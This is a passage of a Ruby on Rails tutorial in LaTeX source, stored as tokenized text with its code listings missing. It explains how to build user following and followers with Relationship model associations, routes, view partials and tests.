▁The ▁result ▁of ▁the ▁above ▁discussion ▁is ▁the ▁user / relationship ▁association ▁show n ▁in ▁Listing ~\ ref { code : user _ relationships _ association } ▁and ▁Listing ~\ ref { code : relationship _ belongs _ to }.
▁Implement ing ▁the ▁active ▁relationships ▁\ k ode { has \_ many } ▁association .
▁( S ince ▁destroying ▁a ▁user ▁should ▁also ▁destroy ▁that ▁user ' s ▁relationships , ▁we ' ve ▁added ▁\ k ode { dependent : ▁: destroy } ▁to ▁the ▁association .)
▁ Adding ▁the ▁follower ▁\ k ode { belongs \_ to } ▁association ▁to ▁the ▁Relationship ▁model .
▁The ▁\ k ode { followed } ▁association ▁is n ' t ▁actually ▁needed ▁un til ▁Section ~\ ref { sec : following }, ▁but ▁the ▁parallel ▁follower / followed ▁structure ▁is ▁clear er ▁if ▁we ▁implement ▁them ▁both ▁at ▁the ▁same ▁time .
▁The ▁relationships ▁in ▁Listing ~\ ref { code : user _ relationships _ association } ▁and ▁Listing ~\ ref { code : relationship _ belongs _ to } ▁give ▁ r is e ▁to ▁methods ▁analogous ▁to ▁the ▁one s ▁we ▁saw ▁in ▁Table ~\ ref { table : association _ methods }, ▁as ▁show n ▁in ▁Table ~\ ref { table : association _ methods _ relationships }.
▁Return s ▁the ▁follower
▁Return s ▁the ▁followed ▁user
▁Create s ▁an ▁active ▁relationship ▁ associated ▁with ▁\ k ode { user }
▁Create s ▁an ▁active ▁relationship ▁ associated ▁with ▁\ k ode { user } ▁( exception ▁on ▁failure )
▁Return s ▁a ▁new ▁Relationship ▁object ▁ associated ▁with ▁\ k ode { user }
▁A ▁summary ▁of ▁user / active ▁relationship ▁association ▁methods .
▁Before ▁mov ing ▁on , ▁we ' ll ▁add ▁a ▁couple ▁of ▁Relationship ▁model ▁validations ▁for ▁completeness .
▁The ▁tests ▁( Listing ~\ ref { code : relationship _ validation _ tests }) ▁and ▁application ▁code ▁( Listing ~\ ref { code : relationship _ validations }) ▁are ▁straightforward .
▁As ▁with ▁the ▁generated ▁user ▁fixture ▁( Listing ~\ ref { code : default _ fixtures }), ▁the ▁generated ▁relationship ▁fixture ▁also ▁violat es ▁the ▁uniqueness ▁constraint ▁i mp o s ed ▁by ▁the ▁corresponding ▁migration ▁( Listing ~\ ref { code : relationships _ migration }).
▁The ▁solution ▁( re m o v ing ▁the ▁fixture ▁contents ▁as ▁in ▁Listing ~\ ref { code : empty _ fixtures }) ▁is ▁also ▁the ▁same ▁( Listing ~\ ref { code : empty _ relationship _ fixture }).
▁Testing ▁the ▁Relationship ▁model ▁validations .
▁ Adding ▁the ▁Relationship ▁model ▁validations .
▁Re m o v ing ▁the ▁contents ▁of ▁the ▁relationship ▁fixture .
▁We ▁come ▁now ▁to ▁the ▁he ar t ▁of ▁the ▁Relationship ▁associations : ▁\ k ode { following } ▁and ▁\ k ode { followers }.
▁Here ▁we ▁will ▁use ▁\ k ode { has \_ many ▁: through } ▁for ▁the ▁first ▁time : ▁a ▁user ▁has ▁many ▁following ▁\ emph { through } ▁relationships , ▁as ▁illustrate d ▁in ▁F igure ~\ ref { fig : user _ has _ many _ following }.
▁By ▁default , ▁in ▁a ▁\ k ode { has \_ many ▁: through } ▁association ▁Rails ▁look s ▁for ▁a ▁foreign ▁key ▁corresponding ▁to ▁the ▁singular ▁version ▁of ▁the ▁association .
▁In ▁other ▁words , ▁with ▁code ▁like
▁Rails ▁would ▁see ▁`` followed s '' ▁and ▁use ▁the ▁singular ▁`` followed '' , ▁as s em b l ing ▁a ▁collection ▁using ▁the ▁\ k ode { followed \_ id } ▁in ▁the ▁\ k ode { relationships } ▁table .
▁But , ▁as ▁noted ▁in ▁Section ~\ ref { sec : a _ problem _ with _ the _ data _ model }, ▁\ k ode { user . followed s } ▁is ▁rather ▁a w k w ar d , ▁so ▁we ' ll ▁write ▁\ k ode { user . following } ▁instead .
▁N at ur ally , ▁Rails ▁allows ▁us ▁to ▁override ▁the ▁default , ▁in ▁this ▁case ▁using ▁the ▁\ k ode { source } ▁parameter ▁( as ▁show n ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships }), ▁which ▁explicitly ▁tell s ▁Rails ▁that ▁the ▁source ▁of ▁the ▁\ k ode { following } ▁array ▁is ▁the ▁set ▁of ▁\ k ode { followed } ~ id s .
▁ Adding ▁the ▁User ▁model ▁\ k ode { following } ▁association .
▁The ▁association ▁defined ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships } ▁lead s ▁to ▁a ▁powerful ▁combination ▁of ▁Active ▁Record ▁and ▁array - like ▁behavior .
▁For ▁example , ▁we ▁can ▁check ▁if ▁the ▁followed ▁users ▁collection ▁includes ▁another ▁user ▁with ▁the ▁\ k ode { include ?}\ ▁method ▁( Section ~\ ref { sec : array s _ and _ range s }), ▁or ▁find ▁objects ▁through ▁the ▁association :
▁A lthough ▁in ▁many ▁context s ▁we ▁can ▁effective ly ▁treat ▁\ k ode { following } ▁as ▁an ▁array , ▁Rails ▁is ▁smart ▁about ▁how ▁it ▁handle s ▁things ▁under ▁the ▁hood .
▁For ▁example , ▁code ▁like
▁look s ▁like ▁it ▁m ight ▁have ▁to ▁pull ▁all ▁the ▁followed ▁users ▁out ▁of ▁the ▁database ▁to ▁apply ▁the ▁\ k ode { include ?}\ ▁method , ▁but ▁in ▁fact ▁for ▁e ff ic i en c y ▁Rails ▁arrange s ▁for ▁the ▁comparison ▁to ▁happen ▁directly ▁in ▁the ▁database .
▁( Compar e ▁to ▁the ▁code ▁in ▁Section ~\ ref { sec : render ing _ microposts }, ▁where ▁we ▁saw ▁that
▁perform s ▁the ▁count ▁directly ▁in ▁the ▁database .)
▁We ' ll ▁also ▁add ▁an ▁ associated ▁\ k ode { following ?}\ ▁boolean ▁method ▁to ▁test ▁if ▁one ▁user ▁is ▁following ▁another
▁On ce ▁you ▁have ▁a ▁lot ▁of ▁experience ▁model ing ▁a ▁particular ▁domain , ▁you ▁can ▁often ▁guess ▁such ▁utility ▁methods ▁in ▁ advance , ▁and ▁even ▁when ▁you ▁can ' t ▁you ' ll ▁often ▁find ▁yourself ▁writing ▁them ▁to ▁make ▁the ▁tests ▁clean er .
▁In ▁this ▁case , ▁though , ▁it ' s ▁O K ▁if ▁you ▁would n ' t ▁have ▁guess ed ▁them .
▁ Software ▁development ▁is ▁usually ▁an ▁iterat ive ▁process --- you ▁write ▁code ▁un til ▁it ▁start s ▁getting ▁ugly , ▁and ▁the n ▁you ▁refactor ▁it --- but ▁for ▁brevity ▁the ▁tutorial ▁present ation ▁is ▁ st re am line d ▁a ▁bit .
▁This ▁is ▁exactly ▁the ▁kind ▁of ▁situation ▁where ▁I ▁like ▁to ▁write ▁some ▁tests ▁first .
▁The ▁reason ▁is ▁that ▁we ▁are ▁quite ▁far ▁from ▁writing ▁a ▁working ▁web ▁interface ▁for ▁following ▁users , ▁but ▁it ' s ▁hard ▁to ▁proceed ▁without ▁some ▁sort ▁of ▁\ emph { client } ▁for ▁the ▁code ▁we ' re ▁developing .
▁In ▁this ▁case , ▁it ' s ▁easy ▁to ▁write ▁a ▁short ▁test ▁for ▁the ▁User ▁model , ▁in ▁which ▁we ▁use ▁\ k ode { following ?}\ ▁to ▁make ▁sure ▁the ▁user ▁is n ' t ▁following ▁the ▁other ▁user , ▁use ▁\ k ode { follow } ▁to ▁follow ▁another ▁user , ▁use ▁\ k ode { following ?}\ ▁to ▁verify ▁that ▁the ▁operation ▁succeed ed , ▁and ▁finally ▁\ k ode { unfollow } ▁and ▁verify ▁that ▁it ▁work ed .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : u til ity _ method _ tests }
▁Tests ▁for ▁some ▁`` following '' ▁utility ▁methods .
▁as ▁show n ▁in ▁Listing ~\ ref { code : follow _ unfollow _ following }.
▁( Note ▁that ▁we ▁have ▁omitted ▁the ▁user ▁\ k ode { self } ▁variable ▁when ever ▁possible .)
▁U til ity ▁methods ▁for ▁following .
▁following
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : follow _ unfollow _ following }, ▁the ▁tests ▁should ▁be ▁\ passing :
▁( end )< n >< n > ▁\ subsection { Follow ers } ▁% ▁( fold )< n > ▁\ label { sec : followers }< n >< n >
▁The ▁final ▁piece ▁of ▁the ▁relationships ▁p u z z le ▁is ▁to ▁add ▁a ▁\ k ode { user . followers } ▁\ line break ▁method ▁to ▁go ▁with ▁\ k ode { user . following }.
▁You ▁may ▁have ▁notice d ▁from ▁F igure ~\ ref { fig : user _ has _ many _ following } ▁that ▁all ▁the ▁information ▁needed ▁to ▁extract ▁an ▁array ▁of ▁followers ▁is ▁already ▁present ▁in ▁the ▁\ k ode { relationships } ▁table
▁The ▁data ▁model ▁the n ▁appears ▁as ▁in ▁F igure ~\ ref { fig : user _ has _ many _ followers }.
▁A ▁model ▁for ▁user ▁followers ▁through ▁ passive ▁relationships .
▁The ▁implementation ▁of ▁the ▁data ▁model ▁in ▁F igure ~\ ref { fig : user _ has _ many _ followers } ▁parallel s ▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships } ▁exactly , ▁as ▁seen ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships }.
▁Implement ing ▁\ k ode { user . followers } ▁using ▁ passive ▁relationships .
▁This ▁is ▁because , ▁in ▁the ▁case ▁of ▁a ▁\ k ode { : followers } ▁attribute , ▁Rails ▁will ▁ singularize ▁`` followers '' ▁and ▁automatically ▁look ▁for ▁the ▁foreign ▁key ▁\ k ode { follower \_ id } ▁in ▁this ▁case .
▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships } ▁keep s ▁the ▁\ k ode { : source } ▁key ▁to ▁emphasize ▁the ▁parallel ▁structure ▁with ▁the ▁\ k ode { has \_ many ▁: following } ▁association .
▁as ▁show n ▁in ▁Listing ~\ ref { code : followers _ test }.
▁( Listing ~\ ref { code : followers _ test } ▁m ight ▁have ▁used ▁a ▁\ k ode { followed \_ by ?}\ ▁method ▁to ▁complement ▁the ▁\ k ode { following ?}\ ▁method , ▁but ▁it ▁turn s ▁out ▁we ▁won ' t ▁need ▁it ▁in ▁our ▁application .)
▁A ▁test ▁for ▁\ k ode { followers }.
▁Listing ~\ ref { code : followers _ test } ▁add s ▁only ▁one ▁line ▁to ▁the ▁test ▁from ▁Listing ~\ ref { code : u til ity _ method _ tests }, ▁but ▁so ▁many ▁things ▁have ▁to ▁go ▁right ▁to ▁get ▁it ▁to ▁pass ▁that ▁it ' s ▁a ▁very ▁ sensitive ▁test ▁of ▁the ▁code ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships }.
▁At ▁this ▁point , ▁the ▁full ▁test ▁suite ▁should ▁be ▁\ passing :
▁followers
▁Section ~\ ref { sec : the _ relationship _ model } ▁placed ▁rather ▁heav y ▁d em and s ▁on ▁our ▁data ▁model ing ▁ skills , ▁and ▁it ' s ▁fine ▁if ▁it ▁take s ▁a ▁while ▁to ▁so a k ▁in .
▁In ▁fact , ▁one ▁of ▁the ▁best ▁ways ▁to ▁understand ▁the ▁associations ▁is ▁to ▁use ▁them ▁in ▁the ▁web ▁interface .
▁In ▁the ▁introduction ▁to ▁this ▁chapter , ▁we ▁saw ▁a ▁preview ▁of ▁the ▁page ▁ flow ▁for ▁user ▁following .
▁In ▁this ▁section , ▁we ▁will ▁implement ▁the ▁basic ▁interface ▁and ▁following / unfollow ing ▁functionality ▁show n ▁in ▁those ▁mockup s .
▁We ▁will ▁also ▁make ▁separate ▁pages ▁to ▁show ▁the ▁user ▁following ▁and ▁followers ▁arrays .
▁In ▁Section ~\ ref { sec : the _ status _ feed }, ▁we ' ll ▁complete ▁our ▁sample ▁application ▁by ▁adding ▁the ▁user ' s ▁status ▁feed .
▁As ▁in ▁previous ▁chapter s , ▁we ▁will ▁find ▁it ▁convenient ▁to ▁use ▁the ▁see d ▁data ▁Rake ▁task ▁to ▁fill ▁the ▁database ▁with ▁sample ▁relationships .
▁This ▁will ▁allow ▁us ▁to ▁design ▁the ▁look ▁and ▁feel ▁of ▁the ▁web ▁pages ▁first , ▁def er r ing ▁the ▁back - end ▁functionality ▁un til ▁later ▁in ▁this ▁section .
▁Code ▁to ▁see d ▁the ▁following ▁relationships ▁appear ▁in ▁Listing ~\ ref { code : sample _ relationships }.
▁Here ▁we ▁some what ▁arbitrar ily ▁arrange ▁for ▁the ▁first ▁user ▁to ▁follow ▁users ~3 ▁through ▁5 1, ▁and ▁the n ▁have ▁users ▁4 ▁through ▁4 1 ▁follow ▁that ▁user ▁back .
▁The ▁result ing ▁relationships ▁will ▁be ▁ s u ff ic i ent ▁for ▁developing ▁the ▁application ▁interface .
▁ Adding ▁following / follower ▁relationships ▁to ▁the ▁sample ▁data .
▁To ▁execute ▁the ▁code ▁in ▁Listing ~\ ref { code : sample _ relationships }, ▁we ▁re seed ▁the ▁database ▁as ▁usual :
▁Now ▁that ▁our ▁sample ▁users ▁have ▁both ▁followed ▁users ▁and ▁followers , ▁we ▁need ▁to ▁update ▁the ▁profile ▁page ▁and ▁Home ▁page ▁to ▁reflect ▁this .
▁We ' ll ▁start ▁by ▁making ▁a ▁partial ▁to ▁display ▁the ▁following ▁and ▁follower ▁sta t ist ic s ▁on ▁the ▁profile ▁and ▁home ▁pages .
▁We ' ll ▁next ▁add ▁a ▁follow / unfollow ▁form , ▁and ▁the n ▁make ▁d ed icated ▁pages ▁for ▁show ing ▁`` following '' ▁( followed ▁users ) ▁and ▁`` followers ''.
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ problem _ with _ the _ data _ model }, ▁we ' ll ▁a do p t ▁Twitter ' s ▁convention ▁of ▁using ▁`` following '' ▁as ▁a ▁ label ▁for ▁followed ▁users , ▁as ▁in ▁`` 50 ▁following ''.
▁This ▁usage ▁is ▁reflect ed ▁in ▁the ▁mockup ▁sequence ▁starting ▁in ▁F igure ~\ ref { fig : page _ flow _ profile _ mockup } ▁and ▁show n ▁in ▁close - up ▁in ▁F igure ~\ ref { fig : stats _ partial _ mockup }.
▁A ▁mockup ▁of ▁the ▁stats ▁partial .
▁The ▁stats ▁in ▁F igure ~\ ref { fig : stats _ partial _ mockup } ▁consist ▁of ▁the ▁number ▁of ▁users ▁the ▁current ▁user ▁is ▁following ▁and ▁the ▁number ▁of ▁followers , ▁each ▁of ▁which ▁should ▁be ▁a ▁link ▁to ▁its ▁respective ▁d ed icated ▁display ▁page .
▁This ▁time , ▁although ▁we ' ll ▁def er ▁the ▁actual ▁pages ▁to ▁Section ~\ ref { sec : following _ and _ followers _ pages }, ▁we ' ll ▁make ▁the ▁routes ▁now , ▁as ▁seen ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes }.
▁This ▁code ▁uses ▁the ▁\ k ode { : member } ▁method ▁inside ▁a ▁\ k ode { resources } ▁\ emph { block }, ▁which ▁we ▁have n ' t ▁seen ▁before , ▁but ▁see ▁if ▁you ▁can ▁guess ▁what ▁it ▁does .
▁ Adding ▁\ k ode { following } ▁and ▁\ k ode { followers } ▁actions ▁to ▁the ▁Users ▁controller .
▁/ users /1/ following
▁S ince ▁both ▁pages ▁will ▁be ▁\ emph { showing } ▁data , ▁the ▁proper ▁HTTP ▁verb ▁is ▁a ▁\ text tt { GET } ▁request , ▁so ▁we ▁use ▁the ▁\ k ode { get } ▁method ▁to ▁arrange ▁for ▁the ▁URLs ▁to ▁respond ▁appropriate ly .
▁ Meanwhile , ▁the ▁\ k ode { member } ▁method ▁arrange s ▁for ▁the ▁routes ▁to ▁respond ▁to ▁URLs ▁containing ▁the ▁user ▁id .
▁The ▁other ▁possibility , ▁\ k ode { collection }, ▁works ▁without ▁the ▁id , ▁so ▁that
▁would ▁respond ▁to ▁the ▁URL ▁/ users / t ig ers ▁( pre sum ably ▁to ▁display ▁all ▁the ▁ti g ers ▁in ▁our ▁application )
▁For ▁more ▁details ▁on ▁such ▁routing ▁options , ▁see ▁the ▁\ href { http :// guides . rubyonrails . org / routing . html }{ Rails ▁G u id es ▁article ▁on ▁`` Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In '' }.
▁A ▁table ▁of ▁the ▁routes ▁generated ▁by ▁Listing ~\ ref { code : following _ followers _ action s _ routes } ▁appears ▁in ▁Table ~\ ref { table : following _ routes }.
▁Note ▁the ▁named ▁routes ▁for ▁the ▁followed ▁user ▁and ▁followers ▁pages , ▁which ▁we ' ll ▁put ▁to ▁use ▁short ly .
▁/ users /1/ followers
▁RESTful ▁routes ▁provided ▁by ▁the ▁custom ▁rules ▁in ▁resource ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes }.
▁With ▁the ▁routes ▁defined , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁define ▁the ▁stats ▁partial , ▁which ▁involve s ▁a ▁couple ▁of ▁links ▁inside ▁a ▁ div , ▁as ▁show n ▁in ▁Listing ~\ ref { code : stats _ partial }.
▁A ▁partial ▁for ▁display ing ▁follower ▁stats .
▁</ strong >
▁followers
▁S ince ▁we ▁will ▁be ▁including ▁the ▁stats ▁on ▁both ▁the ▁user ▁show ▁pages ▁and ▁the ▁home ▁page , ▁the ▁first ▁line ▁of ▁Listing ~\ ref { code : stats _ partial } ▁ pick s ▁the ▁right ▁one ▁using
▁Note ▁also ▁that ▁the ▁following / follower ▁count s ▁are ▁calculat ed ▁through ▁the ▁associations ▁using
▁ Compar e ▁these ▁to ▁the ▁microposts ▁count ▁from ▁Listing ~\ ref { code : user _ show _ microposts }, ▁where ▁we ▁wrote
▁to ▁count ▁the ▁microposts .
▁As ▁in ▁that ▁case , ▁Rails ▁calculat es ▁the ▁count ▁directly ▁in ▁the ▁database ▁for ▁e ff ic i en c y .
▁One ▁final ▁detail ▁worth ▁noting ▁is ▁the ▁presence ▁of ▁CSS ▁id s ▁on ▁some ▁elements , ▁as ▁in
▁This ▁is ▁for ▁the ▁benefit ▁of ▁the ▁Ajax ▁implementation ▁in ▁Section ~\ ref { sec : a _ working _ follow _ button _ with _ ajax }, ▁which ▁access es ▁elements ▁on ▁the ▁page ▁using ▁their ▁unique ▁id s .
▁With ▁the ▁partial ▁in ▁hand , ▁including ▁the ▁stats ▁on ▁the ▁Home ▁page ▁is ▁easy , ▁as ▁show n ▁in ▁Listing ~\ ref { code : home _ page _ stats }.
▁ Adding ▁follower ▁stats ▁to ▁the ▁Home ▁page .
▁</ section >
▁</ aside >
▁To ▁style ▁the ▁stats , ▁we ' ll ▁add ▁some ▁SCSS , ▁as ▁show n ▁in ▁Listing ~\ ref { code : stats _ css } ▁( which ▁contains ▁all ▁the ▁stylesheet ▁code ▁needed ▁in ▁this ▁chapter ).
▁The ▁result ing ▁Home ▁page ▁appears ▁in ▁F igure ~\ ref { fig : home _ page _ follow _ stats }.
▁SCSS ▁for ▁the ▁Home ▁page ▁sidebar .
▁The ▁Home ▁page ▁with ▁follow ▁stats .
▁We ' ll ▁render ▁the ▁stats ▁partial ▁on ▁the ▁profile ▁page ▁in ▁a ▁moment , ▁but ▁first ▁let ' s ▁make ▁a ▁partial ▁for ▁the ▁follow / unfollow ▁button , ▁as ▁show n ▁in ▁Listing ~\ ref { code : follow _ form _ partial }.
▁A ▁partial ▁for ▁a ▁follow / unfollow ▁form .
▁This ▁does ▁nothing ▁but ▁def er ▁the ▁real ▁work ▁to ▁\ k ode { follow } ▁and ▁\ k ode { unfollow } ▁partials , ▁which ▁need ▁new ▁routes ▁for ▁the ▁Relationship s ▁resource , ▁which ▁follows ▁the ▁Microposts ▁resource ▁example ▁( Listing ~\ ref { code : microposts _ resource }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : relationships _ resource }.
▁ Adding ▁the ▁routes ▁for ▁user ▁relationships .
▁The ▁follow / unfollow ▁partials ▁themselves ▁are ▁show n ▁in ▁Listing ~\ ref { code : follow _ form } ▁and ▁Listing ~\ ref { code : unfollow _ form }.
▁A ▁form ▁for ▁following ▁a ▁user .
▁A ▁form ▁for ▁unfollow ing ▁a ▁user .
▁These ▁two ▁forms ▁both ▁use ▁\ k ode { form \_ for } ▁to ▁manipulate ▁a ▁Relationship ▁model ▁object ; ▁the ▁main ▁difference ▁between ▁the ▁two ▁is ▁that ▁Listing ~\ ref { code : follow _ form } ▁build s ▁a ▁\ emph { new } ▁relationship , ▁whereas ▁Listing ~\ ref { code : unfollow _ form } ▁find s ▁the ▁existing ▁relationship .
▁N at ur ally , ▁the ▁form er ▁send s ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁Relationship s ▁controller ▁to ▁\ k ode { create } ▁a ▁relationship , ▁while ▁the ▁latter ▁send s ▁a ▁\ text tt { DELETE } ▁request ▁to ▁\ k ode { destroy } ▁a ▁relationship .
▁( We ' ll ▁write ▁these ▁actions ▁in ▁Section ~\ ref { sec : a _ working _ follow _ button _ the _ standard _ way }. )
▁F inally , ▁you ' ll ▁note ▁that ▁the ▁follow ▁form ▁does n ' t ▁have ▁any ▁content ▁other ▁than ▁the ▁button , ▁but ▁it ▁ still ▁needs ▁to ▁send ▁the ▁\ k ode { followed \_ id } ▁to ▁the ▁controller .
▁We ▁accomplish ▁this ▁with ▁the ▁\ k ode { hidden \_ field \_ tag } ▁method ▁in ▁Listing ~\ ref { code : follow _ form }, ▁which ▁produce s ▁HTML ▁of ▁the ▁form
▁As ▁we ▁saw ▁in ▁Section ~\ ref { sec : reset ting _ the _ password } ▁( Listing ~\ ref { code : password _ reset _ form }), ▁the ▁hidden ▁\ k ode { input } ▁tag ▁put s ▁the ▁relevant ▁information ▁on ▁the ▁page ▁without ▁display ing ▁it ▁in ▁the ▁browser .
▁We ▁can ▁now ▁include ▁the ▁follow ▁form ▁and ▁the ▁following ▁sta t ist ic s ▁on ▁the ▁user ▁profile ▁page ▁simply ▁by ▁rendering ▁the ▁partials , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ follow _ form _ profile _ stats }.
▁ Pro file s ▁with ▁follow ▁and ▁unfollow ▁button s , ▁respectively , ▁appear ▁in ▁F igure ~\ ref { fig : profile _ follow _ button } ▁and ▁F igure ~\ ref { fig : profile _ unfollow _ button }.
▁ Adding ▁the ▁follow ▁form ▁and ▁follower ▁stats ▁to ▁the ▁user ▁profile ▁page .
▁< section >
▁</ h 1>
▁</ ol >
▁A ▁user ▁profile ▁with ▁a ▁follow ▁button ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }).
▁A ▁user ▁profile ▁with ▁an ▁unfollow ▁button ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 }).
▁We ' ll ▁get ▁these ▁button s ▁working ▁soon ▁enough --- in ▁fact , ▁we ' ll ▁do ▁it ▁two ▁ways , ▁the ▁standard ▁way ▁( Section ~\ ref { sec : a _ working _ follow _ button _ the _ standard _ way }) ▁and ▁using ▁Ajax ▁( Section ~\ ref { sec : a _ working _ follow _ button _ with _ ajax }) --- but ▁first ▁we ' ll ▁finish ▁the ▁HTML ▁interface ▁by ▁making ▁the ▁following ▁and ▁followers ▁pages .
▁Pages ▁to ▁display ▁followed ▁users ▁and ▁followers ▁will ▁re s em b le ▁a ▁ hybrid ▁of ▁the ▁user ▁profile ▁page ▁and ▁the ▁user ▁index ▁page ▁( Section ~\ ref { sec : users _ index }), ▁with ▁a ▁sidebar ▁of ▁user ▁information ▁( including ▁the ▁following ▁stats ) ▁and ▁a ▁list ▁of ▁users .
▁In ▁addition , ▁we ' ll ▁include ▁a ▁ ra s ter ▁of ▁small er ▁user ▁profile ▁image ▁links ▁in ▁the ▁sidebar .
▁Mo c k up s ▁matching ▁these ▁requirements ▁appear ▁in ▁F igure ~\ ref { fig : following _ mockup } ▁( following ) ▁and ▁F igure ~\ ref { fig : followers _ mockup } ▁( followers ).
▁A ▁mockup ▁of ▁the ▁user ▁following ▁page .
▁A ▁mockup ▁of ▁the ▁user ▁followers ▁page .
▁Ou r ▁first ▁step ▁is ▁to ▁get ▁the ▁following ▁and ▁followers ▁links ▁to ▁work .
▁We ' ll ▁follow ▁Twitter ' s ▁lead ▁and ▁have ▁both ▁pages ▁require ▁user ▁login .
▁As ▁with ▁most ▁previous ▁examples ▁of ▁access ▁control , ▁we ' ll ▁write ▁the ▁tests ▁first , ▁as ▁show n ▁in ▁Listing ~\ ref { code : following _ followers _ authorization _ test }.
▁Tests ▁for ▁the ▁authorization ▁of ▁the ▁following ▁and ▁followers ▁pages .
▁The ▁only ▁trick y ▁part ▁of ▁the ▁implementation ▁is ▁real i z ing ▁that ▁we ▁need ▁to ▁add ▁two ▁new ▁actions ▁to ▁the ▁Users ▁controller .
▁ Base d ▁on ▁the ▁routes ▁defined ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes }, ▁we ▁need ▁to ▁call ▁them ▁\ k ode { following } ▁and ▁\ k ode { followers }.
▁ Each ▁action ▁needs ▁to ▁set ▁a ▁title , ▁find ▁the ▁user , ▁retrieve ▁either ▁\ k ode {@ user . following } ▁or ▁\ k ode {@ user . followers } ▁( in ▁ paginate d ▁form ), ▁and ▁the n ▁render ▁the ▁page .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : following _ followers _ action s }
▁The ▁\ k ode { following } ▁and ▁\ k ode { followers } ▁actions .
▁In ▁contrast , ▁both ▁actions ▁in ▁Listing ~\ ref { code : following _ followers _ action s } ▁make ▁an ▁\ emph { e xplicit } ▁call ▁to ▁\ k ode { render }, ▁in ▁this ▁case ▁rendering ▁a ▁view ▁called ▁\ k ode { show \_ follow }, ▁which ▁we ▁must ▁create .
▁The ▁reason ▁for ▁the ▁common ▁view ▁is ▁that ▁the ▁ERb ▁is ▁ nearly ▁identical ▁for ▁the ▁two ▁cases , ▁and ▁Listing ~\ ref { code : show _ follow _ view } ▁cover s ▁them ▁both .
▁The ▁\ k ode { show \_ follow } ▁view ▁used ▁to ▁render ▁following ▁and ▁followers .
▁The ▁actions ▁in ▁Listing ~\ ref { code : following _ followers _ action s } ▁render ▁the ▁view ▁from ▁Listing ~\ ref { code : show _ follow _ view } ▁in ▁two ▁context s , ▁`` following '' ▁and ▁`` followers '' , ▁with ▁the ▁results ▁show n ▁in ▁F igure ~\ ref { fig : user _ following } ▁and ▁F igure ~\ ref { fig : user _ followers }.
▁Note ▁that ▁nothing ▁in ▁the ▁above ▁code ▁uses ▁the ▁current ▁user , ▁so ▁the ▁same ▁links ▁work ▁for ▁other ▁users , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : different _ user _ followers }.
▁Show ing ▁the ▁users ▁the ▁given ▁user ▁is ▁following .
▁Show ing ▁the ▁given ▁user ' s ▁followers .
▁Show ing ▁a ▁different ▁user ' s ▁followers .
▁Now ▁that ▁we ▁have ▁working ▁following ▁and ▁followers ▁pages , ▁we ' ll ▁write ▁a ▁couple ▁of ▁short ▁integration ▁tests ▁to ▁verify ▁their ▁behavior .
▁They ▁are ▁design ed ▁to ▁be ▁a ▁sanit y ▁check , ▁not ▁to ▁be ▁com pre h en s ive .
▁Inde ed , ▁as ▁noted ▁in ▁Section ~\ ref { sec : layout _ link _ tests }, ▁com pre h en s ive ▁tests ▁of ▁things ▁like ▁HTML ▁structure ▁are ▁likely ▁to ▁be ▁brittle ▁and ▁thus ▁ counter - product ive .
▁Ou r ▁plan ▁in ▁the ▁case ▁of ▁following / followers ▁pages ▁is ▁to ▁check ▁the ▁number ▁is ▁correctly ▁displayed ▁and ▁that ▁links ▁with ▁the ▁right ▁URLs ▁appear ▁on ▁the ▁page .
▁To ▁get ▁started , ▁we ' ll ▁generate ▁an ▁integration ▁test ▁as ▁usual :
▁Next , ▁we ▁need ▁to ▁as s em b le ▁some ▁test ▁data , ▁which ▁we ▁can ▁do ▁by ▁adding ▁some ▁relationships ▁fixtures ▁to ▁create ▁following / follower ▁relationships .
▁Recall ▁from ▁Section ~\ ref { sec : profile _ micropost _ tests } ▁that ▁we ▁can ▁use ▁code ▁like
▁to ▁associate ▁a ▁micropost ▁with ▁a ▁given ▁user .
▁In ▁particular , ▁we ▁can ▁write
▁App ly ing ▁this ▁idea ▁to ▁the ▁relationships ▁fixtures ▁gives ▁the ▁associations ▁in ▁Listing ~\ ref { code : relationships _ fixtures }.
▁Relationship s ▁fixtures ▁for ▁use ▁in ▁following / follower ▁tests .
▁To ▁test ▁for ▁the ▁right ▁count , ▁we ▁can ▁use ▁the ▁same ▁\ k ode { assert \_ match } ▁method ▁we ▁used ▁in ▁Listing ~\ ref { code : user _ profile _ test } ▁to ▁test ▁for ▁the ▁display ▁of ▁the ▁number ▁of ▁microposts ▁on ▁the ▁user ▁profile ▁page .
▁ Adding ▁in ▁assertion s ▁for ▁the ▁right ▁links ▁yields ▁the ▁tests ▁show n ▁in ▁Listing ~\ ref { code : following _ tests }.
▁Tests ▁for ▁following / follower ▁pages .
▁In ▁Listing ~\ ref { code : following _ tests }, ▁note ▁that ▁we ▁include ▁the ▁assertion
▁which ▁is ▁included ▁to ▁make ▁sure ▁that
▁is n ' t ▁\ href { https :// en . wiki p edia . org / wiki / V ac u ous _ t ru th }{ v ac u ous ly ▁true } ▁( and ▁similar ly ▁for ▁\ k ode { followers }).
▁The ▁test ▁suite ▁should ▁now ▁be ▁\ passing :
▁Now ▁that ▁our ▁views ▁are ▁in ▁order , ▁it ' s ▁time ▁to ▁get ▁the ▁follow / unfollow ▁button s ▁working .
▁Because ▁following ▁and ▁unfollow ing ▁involve ▁creating ▁and ▁destroying ▁relationships , ▁we ▁need ▁a ▁Relationship s ▁controller , ▁which ▁we ▁generate ▁as ▁usual
